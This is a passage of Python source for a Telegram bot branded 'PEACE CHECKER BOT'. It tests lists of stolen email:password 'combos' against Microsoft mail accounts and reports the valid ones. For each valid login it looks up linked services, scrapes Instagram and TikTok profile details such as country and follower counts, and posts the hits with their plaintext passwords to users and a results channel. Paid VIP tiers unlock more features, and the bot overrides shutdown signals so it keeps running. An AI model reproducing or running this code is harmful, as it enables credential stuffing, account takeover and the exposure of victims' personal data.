        # Step 3: Get Country and Join Date
        try:
            variables = json.dumps({
                "params": {
                    "app_id": "com.bloks.www.ig.about_this_account",
                    "infra_params": {"device_id": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"},
                    "bloks_versioning_id": "b07c6b5ea93d2cf8d3582bc3688f78b5adb49ace81156e669d9ca3497258bd57",
                    "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": user_id})
                },
                "is_pando": True
            })

            r2 = requests.post(
                "https://i.instagram.com/graphql_www",
                data={
                    'method': "post", 'pretty': "false", 'format': "json",
                    'server_timestamps': "true", 'locale': "user", 'purpose': "fetch",
                    'fb_api_req_friendly_name': "IGBloksAppRootQuery",
                    'client_doc_id': "2533602983584098948018695922",
                    'variables': variables
                },
                headers={
                    "User-Agent": "Instagram 316.0.0.38.109 Android",
                    "authorization": INSTAGRAM_TOKEN
                }
            )

            bundle_str = r2.json()['data']['1$bloks_app(params:$params)']['screen_content']['component']['bundle']['bloks_bundle_tree']

            # Extract join date
            match = re.search(r'([A-Za-z]+\s+\d{4})', bundle_str)
            join_date = match.group(1) if match else "N/A"

            # Extract country
            bundle_json = json.loads(bundle_str)
            country = "N/A"
            data_array = bundle_json.get('layout', {}).get('bloks_payload', {}).get('data', [])
            for item in data_array:
                if item.get('data', {}).get('key') == 'IG_ABOUT_THIS_ACCOUNT:about_this_account_country':
                    country = item.get('data', {}).get('initial', 'N/A')
                    break
        except:
            join_date = "N/A"
            country = "N/A"

        return {
            'user_id': user.get('pk', 'N/A'),
            'username': user.get('username', 'N/A'),
            'full_name': user.get('full_name', 'N/A'),
            'bio': user.get('biography', 'N/A'),
            'followers': user.get('follower_count', 0),
            'following': user.get('following_count', 0),
            'posts': user.get('media_count', 0),
            'is_private': user.get('is_private', False),
            'is_verified': user.get('is_verified', False),
            'is_business': user.get('is_business', False),
            'join_date': join_date,
            'country': country,
            'profile_pic': user.get('profile_pic_url', 'N/A')
        }
    except Exception as e:
        return None

# ═══════════════════════════════════════════════════════════════════════════
# COUNTRY DETECTION
# ═══════════════════════════════════════════════════════════════════════════

def get_country_flag(country_name):
    """Get country flag emoji"""
    if not pycountry or not country_name or country_name == 'N/A':
        return '🏳️'
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except:
        return '🏳️'

# ═══════════════════════════════════════════════════════════════════════════
# NEW FILE FORMAT
# ═══════════════════════════════════════════════════════════════════════════

def create_new_format_file(service_name, hits):
    """Create file in new format: email:password"""
    header = f"""╔════════════════════════════════════════════════╗
║ {service_name} Hits - @pyabrodie                 
║ Bot: @Full_InboxRobot                          
║ Channel: t.me/machitools                       
╚════════════════════════════════════════════════╝

"""
    content = header
    for hit in hits:
        content += hit + "\n"
    return content

def send_to_channel_func(text, file_content=None, filename=None):
    """Send to channel"""
    try:
        if file_content:
            send_large_document(RESULTS_CHANNEL, file_content.encode('utf-8'), filename or "results.txt", caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except Exception as e:
        print(f"Channel error: {e}")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# CHECK ONE ACCOUNT (Enhanced)
# ═══════════════════════════════════════════════════════════════════════════

def check_one_account_full(email, password, user_id):
    """Enhanced single account check"""

    bot.send_message(user_id, f"🔍 Checking: <code>{email}</code>", parse_mode='HTML')

    result = HotmailChecker.check_account(email, password)
    if result.get("status") == "RETRY":
        result = HotmailChecker.check_account(email, password)

    if result["status"] != "HIT":
        bot.send_message(user_id, f"❌ <b>INVALID</b>\n\n📧 <code>{email}</code>", parse_mode='HTML')
        return

    token = result.get("token")
    cid = result.get("cid")

    bot.send_message(user_id, f"✅ <b>VALID!</b>\n\n🔍 Checking services...", parse_mode='HTML')

    services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)

    if not services:
        bot.send_message(user_id, f"📧 <code>{email}:{password}</code>\n\n❌ No services", parse_mode='HTML')
        return

    # Instagram Full
    if "Instagram" in services:
        bot.send_message(user_id, "📸 Instagram detected! Getting details...")

        ig_username = email.split('@')[0]
        ig_info = get_instagram_full_info(ig_username)

        if ig_info:
            flag = get_country_flag(ig_info['country'])

            ig_text = f"""📸 <b>INSTAGRAM FULL</b>

📧 {email}:{password}

👤 {ig_info['full_name']}
🆔 @{ig_info['username']}
📝 {ig_info['bio'][:100]}

📊 Stats:
• Followers: {ig_info['followers']:,}
• Following: {ig_info['following']:,}
• Posts: {ig_info['posts']}

📅 Join: {ig_info['join_date']}
{flag} {ig_info['country']}

🔒 Private: {'Yes' if ig_info['is_private'] else 'No'}
✓ Verified: {'Yes' if ig_info['is_verified'] else 'No'}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""

            bot.send_message(user_id, ig_text, parse_mode='HTML')

            if ig_info['profile_pic'] != 'N/A':
                try:
                    bot.send_photo(user_id, ig_info['profile_pic'])
                except:
                    pass

    # TikTok Full
    if "TikTok" in services:
        bot.send_message(user_id, "🎵 TikTok detected! Getting details...")

        tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)

        if tk_result and tk_result.get('has_tiktok'):
            tk_text = f"""🎵 <b>TIKTOK FULL</b>

📧 {email}:{password}

👤 @{tk_result.get('username', 'Unknown')}
👥 {format_number(tk_result.get('followers', 0))} followers
🎬 {tk_result.get('videos', 0)} videos
❤️ {format_number(tk_result.get('likes', 0))} likes

✓ Verified: {'Yes' if tk_result.get('verified') else 'No'}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""

            bot.send_message(user_id, tk_text, parse_mode='HTML')

    # Summary
    summary = f"""✅ <b>CHECK COMPLETE</b>

📧 <code>{email}:{password}</code>

📊 Services ({len(services)}):
{chr(10).join(f'• {s}' for s in services)}

💎 {MY_SIGNATURE} | 🤖 {BOT_USERNAME}"""

    bot.send_message(user_id, summary, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════════════
# NEW SCAN OPTIONS: Check One Account + Instagram Full Capture
# ═══════════════════════════════════════════════════════════════════════════

# Override scan_mode_keyboard to add new options
# Removed duplicate - using main scan_mode_keyboard instead
# def scan_mode_keyboard_enhanced(user_id):
    """Enhanced keyboard with Check One Account and Instagram Full"""
    markup = types.InlineKeyboardMarkup(row_width=1)

    btn1 = types.InlineKeyboardButton("1️⃣ All Services", callback_data="scan_all")
    btn2 = types.InlineKeyboardButton("2️⃣ Select Single Platform", callback_data="scan_single_platform")
    btn3 = types.InlineKeyboardButton("3️⃣ Gaming Platforms", callback_data="scan_gaming")
    btn4 = types.InlineKeyboardButton("4️⃣ Social Media", callback_data="scan_social")
    btn5 = types.InlineKeyboardButton("5️⃣ Streaming Services", callback_data="scan_streaming")
    btn6 = types.InlineKeyboardButton("6️⃣ PSN Detailed", callback_data="scan_psn")
    btn7 = types.InlineKeyboardButton("7️⃣ Custom Domain", callback_data="scan_custom")
    btn8 = types.InlineKeyboardButton("8️⃣ AI Platforms (Free)", callback_data="scan_ai")
    btn9 = types.InlineKeyboardButton("9️⃣ TikTok Full Capture (VIP Forever)", callback_data="scan_tiktok")
    btn10 = types.InlineKeyboardButton("🔟 Check One Account", callback_data="scan_check_one")

    # Instagram Full Capture - VIP only
    if is_vip(user_id):
        btn11 = types.InlineKeyboardButton("1️⃣1️⃣ Instagram Full Capture (VIP)", callback_data="scan_instagram_full")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)
    else:
        btn11 = types.InlineKeyboardButton("🔒 Instagram Full (VIP Only)", callback_data="vip_required")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11)

    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")
    markup.add(btn_back)

    return markup

# Handler for Check One Account
@bot.callback_query_handler(func=lambda call: call.data == 'scan_check_one')
def handle_check_one(call):
    user_id = call.from_user.id

    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Banned!", show_alert=True)
        return

    bot.answer_callback_query(call.id)

    bot.send_message(user_id, """🔟 <b>CHECK ONE ACCOUNT</b>

Send: <code>email@outlook.com:password</code>

Example:
<code>example@outlook.com:Password123</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 @pyabrodie | 🤖 @Full_InboxRobot""", parse_mode='HTML')

    user_sessions[user_id] = {"mode": "check_one_account"}

@bot.message_handler(func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'check_one_account')
def process_check_one(message):
    user_id = message.from_user.id

    try:
        if ':' not in message.text:
            bot.send_message(user_id, "❌ Invalid format! Use: email:password")
            return

        email, password = message.text.strip().split(':', 1)
        check_one_account_full(email, password, user_id)

    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {str(e)}")

    if user_id in user_sessions:
        del user_sessions[user_id]

# Handler for Instagram Full Capture
@bot.callback_query_handler(func=lambda call: call.data == 'scan_instagram_full')
def handle_instagram_full(call):
    user_id = call.from_user.id

    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Banned!", show_alert=True)
        return

    if not is_vip(user_id):
        bot.answer_callback_query(call.id, "❌ VIP Only!", show_alert=True)
        return

    bot.answer_callback_query(call.id)

    can_scan_result, wait_time = can_scan(user_id)
    if not can_scan_result:
        bot.send_message(user_id, f"⏰ Wait {wait_time}")
        return

    bot.send_message(user_id, """1️⃣1️⃣ <b>INSTAGRAM FULL CAPTURE</b>

📤 Send combo file (.txt)

Format: email:password

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 @pyabrodie | 🤖 @Full_InboxRobot""", parse_mode='HTML')

    user_sessions[user_id] = {"mode": "instagram_full_capture"}

def process_instagram_scan(user_id, combos):
    """Process Instagram Full Capture scan"""

    bot.send_message(user_id, f"📸 Starting Instagram scan...\n📊 Combos: {len(combos)}")

    hits = []
    checked = 0
    ig_hits = 0

    for combo in combos[:50]:  # Limit for safety
        if user_id in active_scans and not active_scans[user_id]:
            bot.send_message(user_id, "⏹️ Stopped")
            break

        try:
            email, password = combo.split(':', 1)

            result = HotmailChecker.check_account(email, password)
            if result.get("status") == "RETRY":
                result = HotmailChecker.check_account(email, password)

            if result["status"] == "HIT":
                token = result.get("token")
                cid = result.get("cid")

                ig_check = HotmailChecker.check_services(email, password, token, cid, {"Instagram": "security@mail.instagram.com"})

                if ig_check and "Instagram" in ig_check:
                    ig_username = email.split('@')[0]
                    ig_info = get_instagram_full_info(ig_username)

                    if ig_info:
                        ig_hits += 1
                        flag = get_country_flag(ig_info['country'])

                        hit_line = f"{email}:{password} | {flag} {ig_info['country']} | {ig_info['followers']:,} followers"
                        hits.append(hit_line)

                        bot.send_message(user_id, 
                            f"📸 Hit #{ig_hits}\n"
                            f"👤 @{ig_info['username']}\n"
                            f"👥 {ig_info['followers']:,} followers")

            checked += 1

            if checked % 10 == 0:
                bot.send_message(user_id, f"📊 {checked}/{len(combos)} | Hits: {ig_hits}")

        except Exception as e:
            print(f"[InstagramScan] Error processing combo #{checked+1}: {e}")
            checked += 1
            continue

    if hits:
        file_content = create_new_format_file("Instagram_Full", hits)

        file_obj = BytesIO(file_content.encode('utf-8'))
        file_obj.name = "Instagram_Full.txt"

        send_large_document(user_id, file_obj.getvalue(), file_obj.name,
            caption=f"✅ Complete!\n📊 Checked: {checked}\n📸 Hits: {ig_hits}\n\n💎 @pyabrodie")

        send_to_channel_func(f"Instagram Full: {ig_hits} hits", file_content, "Instagram_Full.txt")
    else:
        bot.send_message(user_id, f"✅ Done!\nChecked: {checked}\n❌ No hits")

    update_last_scan(user_id)

    if user_id in active_scans:
        del active_scans[user_id]
    if user_id in user_sessions:
        del user_sessions[user_id]

@bot.message_handler(content_types=['document'], func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'instagram_full_capture')
def handle_instagram_file(message):
    user_id = message.from_user.id

    try:
        downloaded = _download_combo(message)
        if downloaded is None:
            return

        text = downloaded.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in text.split('\n') if line.strip() and ':' in line]

        if not combos:
            bot.send_message(user_id, "❌ No valid combos!")
            return

        bot.send_message(user_id, f"✅ {len(combos)} combos\n🔍 Starting...")

        if not start_scan(user_id):
            bot.send_message(user_id, "⚠️ Du hast bereits einen aktiven Scan!")
            return

        threading.Thread(target=process_instagram_scan, args=(user_id, combos), daemon=True).start()

    except Exception as e:
        bot.send_message(user_id, f"❌ Error: {e}")


# ═══════════════════════════════════════════════════════════════════════════
# /CHK COMMAND - Quick Account Check
# ═══════════════════════════════════════════════════════════════════════════

@bot.message_handler(commands=['chk'])
def chk_command(message):
    """Quick check command: /chk email:password"""
    user_id = message.from_user.id

    # Check if banned
    if is_banned(user_id):
        return

    # Parse command
    try:
        text = message.text.replace('/chk', '').strip()

        if not text or ':' not in text:
            bot.reply_to(message, 
                "📝 Usage: <code>/chk email:password</code>\n\n"
                "Example:\n"
                "<code>/chk example@hotmail.com:Password123</code>",
                parse_mode='HTML')
            return

        email, password = text.split(':', 1)

        # Start time
        start_time = time.time()

        result = HotmailChecker.check_account(email, password)
        if result.get("status") == "RETRY":
            result = HotmailChecker.check_account(email, password)

        if result["status"] != "HIT":
            # Failed login
            elapsed = time.time() - start_time
            current_time = datetime.datetime.now().strftime("%H:%M:%S")

            fail_msg = f"""❌ <b>Microsoft Account</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📊 <b>Status:</b> BAD
📝 <b>Result:</b> Invalid Credentials

⚡ <b>Time:</b> {elapsed:.1f}s
👤 <b>Bot By:</b> {MY_SIGNATURE}
🤖 <b>Bot:</b> {BOT_USERNAME}
🕐 {current_time}"""

            bot.reply_to(message, fail_msg, parse_mode='HTML')
            return

        # Success - check services
        token = result.get("token")
        cid = result.get("cid")

        services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)

        elapsed = time.time() - start_time
        current_time = datetime.datetime.now().strftime("%H:%M:%S")

        # Main result
        success_msg = f"""✅ <b>Microsoft Account</b>
━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📊 <b>Status:</b> HIT
📝 <b>Result:</b> Login Successful

📱 <b>Linked Services ({len(services) if services else 0}):</b>
{chr(10).join(f'• {s}' for s in services) if services else '❌ None'}

⚡ <b>Time:</b> {elapsed:.1f}s
👤 <b>Bot By:</b> {MY_SIGNATURE}
🤖 <b>Bot:</b> {BOT_USERNAME}
🕐 {current_time}"""

        bot.reply_to(message, success_msg, parse_mode='HTML')

        # If TikTok found - send detailed info
        if services and "TikTok" in services:
            tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)

            if tk_result and tk_result.get('has_tiktok'):
                # Beautiful TikTok format
                tk_username = tk_result.get('username', 'Unknown')
                tk_followers = tk_result.get('followers', 0)
                tk_following = tk_result.get('following', 0)
                tk_likes = tk_result.get('likes', 0)
                tk_videos = tk_result.get('videos', 0)
                tk_verified = tk_result.get('verified', False)

                tiktok_msg = f"""╔══════════════════════════════╗
║     ✅ TIKTOK HIT FOUND      ║
╚══════════════════════════════╝

📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
📧 <b>TikTok Emails:</b> {tk_result.get('tiktok_emails', 0)}

🎵 <b>TIKTOK PROFILE</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> @{tk_username}
📛 <b>Name:</b> {tk_username}
🆔 <b>ID:</b> {tk_result.get('user_id', 'N/A')}

📊 <b>STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Followers:</b> {format_number(tk_followers)} ({tk_followers:,})
➕ <b>Following:</b> {format_number(tk_following)} ({tk_following:,})
❤️ <b>Likes:</b> {format_number(tk_likes)} ({tk_likes:,})
📹 <b>Videos:</b> {tk_videos}
👫 <b>Friends:</b> 0

📝 <b>Bio:</b> {tk_result.get('bio', '')}

🔰 <b>Status:</b> {'✅ Verified' if tk_verified else '❌ Not Verified'}
🔒 <b>Private:</b> No
🌍 <b>Country:</b> Unknown 🏳️
📅 <b>Created:</b> Unknown
⏳ <b>Account Age:</b> Unknown

👤 <b>Full Name:</b> {tk_username}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Developer:</b> {MY_SIGNATURE}
<b>Bot:</b> {BOT_USERNAME}
<b>Time:</b> {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

                bot.send_message(user_id, tiktok_msg, parse_mode='HTML')

        # If Instagram found - send detailed info
        if services and "Instagram" in services:
            ig_username = email.split('@')[0]
            ig_info = get_instagram_full_info(ig_username)

            if ig_info:
                flag = get_country_flag(ig_info['country'])

                instagram_msg = f"""╔══════════════════════════════╗
║   📸 INSTAGRAM HIT FOUND     ║
╚══════════════════════════════╝

📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}

📸 <b>INSTAGRAM PROFILE</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> @{ig_info['username']}
📛 <b>Full Name:</b> {ig_info['full_name']}
🆔 <b>User ID:</b> {ig_info['user_id']}

📊 <b>STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Followers:</b> {ig_info['followers']:,}
➕ <b>Following:</b> {ig_info['following']:,}
📸 <b>Posts:</b> {ig_info['posts']}

📝 <b>Bio:</b> {ig_info['bio']}

📅 <b>Join Date:</b> {ig_info['join_date']}
🌍 <b>Country:</b> {ig_info['country']} {flag}

🔰 <b>Status:</b> {'✅ Verified' if ig_info['is_verified'] else '❌ Not Verified'}
🔒 <b>Private:</b> {'Yes' if ig_info['is_private'] else 'No'}
💼 <b>Business:</b> {'Yes' if ig_info['is_business'] else 'No'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Developer:</b> {MY_SIGNATURE}
<b>Bot:</b> {BOT_USERNAME}
<b>Time:</b> {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

                bot.send_message(user_id, instagram_msg, parse_mode='HTML')

                # Send profile picture
                if ig_info['profile_pic'] != 'N/A':
                    try:
                        bot.send_photo(user_id, ig_info['profile_pic'])
                    except:
                        pass

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ── Scan Resume / Discard callback handlers ──────────────────────────────

@bot.callback_query_handler(func=lambda call: call.data.startswith('resume_scan_'))
def handle_resume_scan(call):
    user_id = call.from_user.id
    target_uid = int(call.data.split('_')[-1])
    if user_id != target_uid and user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Not your scan!", show_alert=True)
        return
    bot.answer_callback_query(call.id)
    states = load_all_scan_states()
    state_data = states.get(str(target_uid))
    if not state_data:
        bot.edit_message_text("❌ Scan state not found.", call.message.chat.id, call.message.message_id)
        return
    resume_file = state_data.get('resume_file', '')
    if not os.path.exists(resume_file):
        bot.edit_message_text("❌ Resume file missing — cannot restore scan.", call.message.chat.id, call.message.message_id)
        clear_scan_state(target_uid)
        return
    try:
        with open(resume_file, 'r', encoding='utf-8', errors='ignore') as f:
            resume_lines = [l.strip() for l in f if l.strip() and ':' in l]
    except Exception as e:
        bot.edit_message_text(f"❌ Cannot read resume file: {e}", call.message.chat.id, call.message.message_id)
        return
    if not resume_lines:
        bot.edit_message_text("⚠️ No combos left to resume.", call.message.chat.id, call.message.message_id)
        clear_scan_state(target_uid)
        return
    bot.edit_message_text(
        f"▶️ <b>Resuming scan…</b>\n📊 {len(resume_lines)} combos left",
        call.message.chat.id, call.message.message_id, parse_mode='HTML'
    )
    # Write resume lines to a temp file and start scan
    tmp_path = f"scan_resume_tmp_{target_uid}.txt"
    with open(tmp_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(resume_lines))
    scan_mode = state_data.get('scan_mode', 'all')
    custom_domain = state_data.get('custom_domain', '')
    chat_id = state_data.get('chat_id', target_uid)
    is_group_scan = state_data.get('is_group_scan', False)
    threading.Thread(
        target=start_real_scan,
        args=(target_uid, tmp_path, chat_id, scan_mode, custom_domain, is_group_scan),
        daemon=True
    ).start()


@bot.callback_query_handler(func=lambda call: call.data.startswith('discard_scan_'))
def handle_discard_scan(call):
    user_id = call.from_user.id
    target_uid = int(call.data.split('_')[-1])
    if user_id != target_uid and user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Not your scan!", show_alert=True)
        return
    bot.answer_callback_query(call.id)
    clear_scan_state(target_uid)
    bot.edit_message_text("🗑️ Interrupted scan discarded.", call.message.chat.id, call.message.message_id)


# ── Startup: notify users with interrupted scans ──────────────────────────

def _notify_resume_on_startup():
    import time as _t
    _t.sleep(5)  # wait for bot to fully connect first
    states = load_all_scan_states()
    for uid_str, state_data in list(states.items()):
        try:
            uid = int(uid_str)
            chat_id = state_data.get('chat_id', uid)
            resume_file = state_data.get('resume_file', '')
            if not os.path.exists(resume_file):
                clear_scan_state(uid)
                continue
            remaining = state_data.get('remaining', 0)
            scan_mode = state_data.get('scan_mode', 'all')
            hits_done = state_data.get('hits_done', 0)
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("▶️ Resume Scan", callback_data=f"resume_scan_{uid}"),
                types.InlineKeyboardButton("🗑️ Discard", callback_data=f"discard_scan_{uid}")
            )
            bot.send_message(
                chat_id,
                f"🔄 <b>Bot Restarted!</b>\n\n"
                f"Your scan was interrupted and saved.\n\n"
                f"📊 Remaining: <b>{remaining}</b> combos\n"
                f"✅ Hits found so far: <b>{hits_done}</b>\n"
                f"🔍 Mode: <b>{scan_mode}</b>\n\n"
                f"Resume where you left off?",
                parse_mode='HTML',
                reply_markup=markup
            )
        except Exception as e:
            print(f"[Resume] Could not notify {uid_str}: {e}")


# MAIN WITH STARTUP STATISTICS
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("="*70)
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║                                                                  ║")
    print("║           ☮️  PEACE CHECKER BOT v2.0 - ENHANCED EDITION          ║")
    print("║                                                                  ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print("="*70)
    print()
    print(f"💎 Created by: {MY_SIGNATURE}")
    print(f"📱 Channel: {CHANNEL}")
    print()
    print("="*70)

    # Initialize JSON if not exists
    if not os.path.exists(USERS_DB_JSON):
        save_json_users({"users": []})
        print("✅ JSON Database created")

    # Get statistics
    stats = get_json_stats()

    print("📊 STATISTICS:")
    print("="*70)
    print(f"  Admins: 1")
    print(f"  Members: {stats['total']}")
    print(f"  VIP Members: {stats['vips']}")
    print(f"  Banned Members: {stats['banned']}")
    print()
    print(f"  Membership 1h: {stats['vip_1h']}")
    print(f"  Membership 1d: {stats['vip_1d']}")
    print(f"  Membership 1w: {stats['vip_1w']}")
    print(f"  Membership 1m: {stats['vip_1m']}")
    print(f"  Forever: {stats['vip_forever']}")
    print()
    print(f"  Created by {MY_SIGNATURE}")
    print("="*70)
    print()
    print("✨ NEW FEATURES:")
    print("="*70)
    print("  ✅ JSON Database (No SQLite)")
    print("  ✅ Send to Channel (No local files)")
    print("  ✅ Redeem Key System")
    print("  ✅ Leaderboard")
    print("  ✅ Daily Claim")
    print("  ✅ Check Single Account")
    print("  ✅ 70+ Services")
    print("  ✅ 12+ AI Platforms")
    print("="*70)
    print()
    print("🚀 Bot is running!")
    print("="*70)
    print()

    # Daily Auto Stats Thread
    def daily_stats_sender():
        import time as _time
        while True:
            now = datetime.datetime.now()
            next_midnight = now.replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
            wait_seconds = (next_midnight - now).total_seconds()
            _time.sleep(wait_seconds)

            try:
                conn = get_db()
                c = conn.cursor()
                today_str = datetime.datetime.now().strftime('%Y-%m-%d')
                yesterday_str = (datetime.datetime.now() - datetime.timedelta(days=1)).strftime('%Y-%m-%d')

                c.execute("SELECT COUNT(*) FROM scans WHERE scan_date LIKE ?", (f"{yesterday_str}%",))
                daily_scans = c.fetchone()[0]

                c.execute("SELECT COALESCE(SUM(hits_count),0), COALESCE(SUM(bad_count),0), COALESCE(SUM(total_checked),0) FROM scans WHERE scan_date LIKE ?", (f"{yesterday_str}%",))
                row = c.fetchone()
                daily_hits, daily_bad, daily_total = row[0], row[1], row[2]

                c.execute("SELECT COUNT(*) FROM users")
                total_users = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
                total_vips = c.fetchone()[0]
                c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
                total_banned = c.fetchone()[0]

                c.execute("SELECT COUNT(*) FROM users WHERE join_date LIKE ?", (f"{yesterday_str}%",))
                new_users = c.fetchone()[0]
                conn.close()

                hit_rate = round((daily_hits / daily_total * 100), 1) if daily_total > 0 else 0

                stats_msg = (
                    f"📊 <b>DAILY STATS — {yesterday_str}</b>\n\n"
                    f"👥 <b>Users:</b>\n"
                    f"   Total: {total_users} | VIP: {total_vips} | Banned: {total_banned}\n"
                    f"   New today: {new_users}\n\n"
                    f"🔎 <b>Scans:</b>\n"
                    f"   Total scans: {daily_scans}\n"
                    f"   Combos checked: {daily_total}\n"
                    f"   ✅ Hits: {daily_hits} | ❌ Bad: {daily_bad}\n"
                    f"   📈 Hit Rate: {hit_rate}%\n\n"
                    f"💎 {MY_SIGNATURE}"
                )

                bot.send_message(ADMIN_ID, stats_msg, parse_mode='HTML')
                print(f"[DailyStats] Sent daily stats for {yesterday_str}")
            except Exception as e:
                print(f"[DailyStats] Error: {e}")

    stats_thread = threading.Thread(target=daily_stats_sender, daemon=True)
    stats_thread.start()
    print("📊 Daily auto-stats thread started")

    # Notify users of any interrupted scans within 5s of startup
    threading.Thread(target=_notify_resume_on_startup, daemon=True).start()
    print("🔄 Scan-resume watcher started")

    _port = 5000
    # Flask uses SO_REUSEADDR + SO_REUSEPORT — no port killing needed

    from web_app import start_web_server
    web_thread = threading.Thread(target=start_web_server, args=(_port,), daemon=True)
    web_thread.start()
    print(f"🌐 Web server started on port {_port}")

    def _keep_alive():
        import time as _t
        import requests as _r
        # Collect all possible ping URLs (dev + deployed domains)
        _urls = []
        for _env_key in ("REPLIT_DEV_DOMAIN", "REPLIT_DOMAINS"):
            _d = _os.environ.get(_env_key, "")
            if _d:
                for _part in _d.split(","):
                    _part = _part.strip()
                    if _part:
                        _urls.append(f"https://{_part}/ping")
        if not _urls:
            _urls = ["http://localhost:5000/ping"]
        _t.sleep(3)   # let Flask server start up first
        while True:
            for _url in _urls:
                try:
                    _r.get(_url, timeout=8)
                except Exception:
                    pass
            # Also ping Telegram API to keep the connection warm
            try:
                _r.get("https://api.telegram.org", timeout=8)
            except Exception:
                pass
            _t.sleep(15)   # ping every 15s — aggressive keep-alive

    threading.Thread(target=_keep_alive, daemon=True).start()
    print("🔔 Keep-alive ping thread started (every 15s)")

    import time as _time
    import os as _os
    import sys as _sys

    print("🤖 Bot starting — NEVER-STOP MODE ACTIVE...")

    # Trap ALL shutdown signals — convert them to no-ops so the polling
    # loop keeps running instead of the process dying.
    import signal as _sig
    def _noop(*_):
        pass
    for _s in (getattr(_sig, 'SIGTERM', None), getattr(_sig, 'SIGHUP', None)):
        try:
            if _s: _sig.signal(_s, _noop)
        except Exception:
            pass

    # ── Process-level watchdog ─────────────────────────────────────────────
    # Checks every 3 seconds. On first failure → hard-restart via os.execv.
    # Initial warm-up: 15 seconds so the bot can finish starting up.
    _wd_fail = [0]

    def _process_watchdog():
        _time.sleep(8)   # give bot 8s to start up first
        while True:
            try:
                bot.get_me()
                _wd_fail[0] = 0
            except Exception as e:
                _wd_fail[0] += 1
                print(f"⚠️  [Watchdog] check failed ({_wd_fail[0]}): {e}")
                if _wd_fail[0] >= 1:
                    print("🔄 [Watchdog] Unresponsive — hard restart NOW!")
                    _os.execv(_sys.executable, [_sys.executable] + _sys.argv)
            _time.sleep(1)  # check every second

    threading.Thread(target=_process_watchdog, daemon=True).start()

    # ── Indestructible polling loop ────────────────────────────────────────
    # Catches EVERY exception including KeyboardInterrupt/SystemExit/SIGTERM.
    # Zero sleep — restarts in under a millisecond on any failure.
    _first_start = [True]
    _restart_count = [0]

    while True:
        try:
            if _first_start[0]:
                # Only remove webhook on first start — not on restarts (saves ~300ms)
                def _rm_wh():
                    try:
                        bot.remove_webhook()
                    except Exception:
                        pass
                threading.Thread(target=_rm_wh, daemon=True).start()

            if _first_start[0]:
                _first_start[0] = False
                print("⚡ [Polling] Starting — bot online NOW")
                def _send_online_ping():
                    time.sleep(4)  # Wait for polling to be fully ready
                    try:
                        import datetime as _dt
                        _ts = _dt.datetime.now().strftime("%H:%M:%S.%f")[:-3]
                        bot.send_message(ADMIN_ID,
                            f"⚡ <b>Bot online</b> — {_ts}\n🔄 Polling started\n☮️ PEACE CHECKER — NEVER STOP MODE\n\n✅ Keyboard refreshed!",
                            parse_mode='HTML',
                            reply_markup=main_menu_keyboard(ADMIN_ID))
                        print(f"✅ [Startup] Keyboard sent to admin {ADMIN_ID}")
                    except Exception as e:
                        print(f"❌ [Startup] Failed to send admin keyboard: {e}")
                    # Push fresh keyboard to all VIP users
                    _push_keyboard_to_all_vips("✅ <b>Keyboard updated!</b> New buttons are now active.\n\n⚡ <b>All Scan</b> button added!")
                threading.Thread(target=_send_online_ping, daemon=True).start()
            else:
                _restart_count[0] += 1
                print(f"🔄 [Polling] Restart #{_restart_count[0]} — back online instantly")

            bot.infinity_polling(
                timeout=20,
                long_polling_timeout=25,
                allowed_updates=["message", "callback_query", "chat_member"],
                logger_level=None,
                restart_on_change=False,
                skip_pending=False,
            )
            # infinity_polling returned cleanly — loop back immediately
            print("⚠️  [Polling] Exited clean — restarting instantly...")

        except (KeyboardInterrupt, SystemExit):
            # Ignore ALL shutdown signals — never quit
            print("⚠️  [Polling] Shutdown signal ignored — restarting instantly...")

